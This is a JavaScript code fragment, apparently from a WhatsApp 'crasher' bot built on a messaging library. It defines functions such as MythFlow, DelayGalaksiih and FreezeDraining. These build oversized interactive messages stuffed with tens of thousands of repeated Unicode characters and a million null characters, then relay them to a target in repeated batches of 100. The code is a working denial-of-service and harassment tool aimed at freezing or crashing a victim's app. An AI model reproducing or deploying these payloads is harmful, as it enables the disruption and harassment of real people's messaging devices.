title: "",
body: "",
thumbnailUrl: "https://example.com/",
mediaType: 1,
mediaUrl: "",
sourceUrl: "https://t.me/VerseNotDev",
showAdAttribution: false
}
}
}
}
}
},
{}
);

await sock.relayMessage(target, msg.message, {
participant: { jid: target },
messageId: msg.key.id
});
} 

async function DelayGalaksiih(target) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now();
let count = 0;

const sendNext = async () => {
if (Date.now() - startTime >= totalDurationMs) {
console.log(`Stopped after sending ${count} messages`);
return;
}

try {
if (count < 100) {
ZxDelay(sock, target, false) // Function
await new Promise((resolve) => setTimeout(resolve, 500));
console.log(chalk.red(`Send Bug By Verse Offc ${count}/100 To ${jid}`));
count++;
setTimeout(sendNext, 500);
} else {
console.log(chalk.green(`SUCCESS SEND 100 MESSAGE ✅`));
count = 0;
console.log(chalk.blue("NEXT SEND 100 MESSAGE ☠️"));
setTimeout(sendNext, 100);
}
} catch (error) {
console.error(`❌ Error: ${error.message}`);
setTimeout(sendNext, 100);
}
};
sendNext();
}

async function MythFlow(target) {
const msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: " #4izxvelzExerc1st. ",
hasMediaAttachment: false
},
body: {
text: "@rizxvelzexct" + "ꦾ".repeat(19999)
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: `${"𑲭𑲭".repeat(19999)}`,
sections: [
{
title: "i wanna be kill you",
rows: []
}
]
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: `Null ${"ꦽ".repeat(19999)}`,
url: "https://t.me/rizxvelzexct",
merchant_url: "https://t.me/rizxvelzexct"
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: `Execute ${"𑜦𑜠".repeat(19999)}`,
url: "https://wa.me/stickerpack/4izxvelzexect",
merchant_url: "https://wa.me/stickerpack/4izxvelzexect"
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: `Execute ${"ꦾ".repeat(19999)}`,
url: "https://wa.me/stickerpack/4izxvelzexect",
merchant_url: "https://wa.me/stickerpack/4izxvelzexect"
})
}
]
}
}
}
}
}, {});

const Qcrl = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast"
},
message: {
interactiveMessage: {
body: { 
title: "AroganzzCrasher Attacking You", 
text: "\u0000".repeat(1000000),
footer: "AroganzzCrasher",
description: ""
},
carouselMessage: {
cards: []
},
contextInfo: {
mentionedJid: ["status@broadcast"]
}
}
}
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function FreezeDraining(target) { 
for (let i = 0; i <= 1; i++) {
await TrazPrivate(target, Qcrl, mention)
await KeJaaUI(target, Qcrl)
await PayloadV2(target, Qcrl, ptcp = true)
await InvisHard(target, Qcrl, mention = false, delayMs = 500)
await FreezeFileInvis(target, Qcrl, Ptcp = true)
await FreezeCrash(target, Qcrl)
await DelayGalaksiih(target, Qcrl)
}
}

module.exports = { CrashSystem, MessageSQL, FreezeDraining, MythFlow }
